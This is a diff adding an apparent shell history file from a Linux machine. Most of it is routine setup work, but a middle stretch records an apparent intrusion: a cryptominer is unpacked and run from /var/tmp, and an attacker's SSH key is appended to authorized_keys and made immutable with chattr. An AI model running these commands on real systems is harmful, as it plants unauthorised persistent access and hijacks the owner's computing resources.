@@ -1,0 +1,86 @@
+ip a
+ping 8.8.8.8
+ping 8.8.8.8
+nft list rule
+nft list ruleset
+cat /etc/q
+su -
+
+su
+su -
+ls
+passwd william
+su -
+ㄠs
+ls
+wget "releases.llvm.org/9.0.0/cfe-9.0.0.src.tar.xz"
+tmux a
+tmux  a
+tmux
+ls
+ls
+ls
+sl
+ls -al
+ls
+ls
+ls
+ping www.google.com
+pacman -Sy clang
+sudo pacman -Sy clang
+su -
+ls
+wget https://download.open-mpi.org/release/open-mpi/v4.0/openmpi-4.0.2.tar.gz
+ls
+tmux a
+tmux 
+vim /etc/locale.gen
+ls
+exit
+ls
+cd
+ls
+cd .pkg
+ls
+cd .pkg
+ls
+sudo vim /etc/locale.gen
+su root
+su root
+w
+uname -m
+nproc
+cd /var/tmp
+ls -a
+ls
+tar xzvf miner.tgz
+rm -rf miner.tgz
+cd dn/
+./r
+top
+cd ..
+mkdir .ssh;echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIEAzmB/GU9O4EuSv2J7IxyuLsqYfZdk15R8ykeuyX8tujqLY0Ad8THuYjRNCe2PBWpH1PKKqXqRFWHIMU5oLz/G0pnFCRXx1jtUOSwch15RmwDD4f15aFmuHCgDoROq7w7b7ILsdUjSz7MFjMK/e/OweASvv4hyNrqBh1VE2Gl3Lfc= UstupidMF" >> .ssh/authorized_keys
+chattr +iau .ssh ;cd .ssh ;chattr +iau authorized_keys 
+w
+top
+cd /var/tmp/dn
+ls
+cat c.jason
+./r
+top
+ls
+nano r
+top
+./r
+cd
+exit
+history 
+history 
+ls
+cat ~/.ssh/authorized_keys 
+ls
+vim ~/.ssh/authorized_keys 
+systemctl restart sshd.service
+su -
+su root
+exit
